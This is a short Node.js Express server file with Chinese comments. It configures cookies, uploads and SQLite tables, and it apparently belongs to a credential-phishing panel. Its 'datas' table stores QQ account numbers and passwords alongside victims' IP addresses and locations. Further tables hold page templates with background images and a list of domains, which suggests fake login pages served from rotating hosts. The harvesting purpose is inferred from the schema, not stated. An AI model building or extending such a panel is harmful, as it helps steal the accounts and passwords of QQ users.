const config = require('./config.json');
var express = require('express');
var partials = require('express-partials');
var multer = require('multer');
var bodyParser = require("body-parser");
var sql = require('./db/sqlite.js');
var cookieParser = require('cookie-parser'); //如果要使用cookie，需要显式包含这个模块

var rd = require('rd');

var app = express();
// 设置 Cookie
app.use(cookieParser('dl-x'));
app.use(partials());
app.use(bodyParser.urlencoded({ extended: false }));

app.use(multer({ dest: './views/upload/' }));

// 建表
sql.all('create table users(id integer PRIMARY KEY,tempId integer,isAdmin integer,isDelete integer,userPwd text,userName text,regTime text);',function(){})
sql.all('create table temps(id integer PRIMARY KEY,tempName text,bgUrl text,isDelete integer,createTime text);',function(){});
sql.all('create table datas(id integer PRIMARY KEY,qq text,pwd text,ip text,address text,tempId integer,userId integer,isDelete integer);',function(){});
sql.all('create table urls(id integer PRIMARY KEY,domain text,type integer,isDelete integer);',function(){});
// 差一个默认admin用户

rd.eachFileFilterSync('controller', /\.js$/, function (f, s) {
  if (f.indexOf('resource.js') <= 0) {
      var _router = require(f);
      typeof _router === 'function' ? _router(app) : 0;
  }
});
require('./test.js')(app);
require('./controller/resource.js')(app);

app.engine('html', require('ejs').renderFile);
app.listen(config.port);
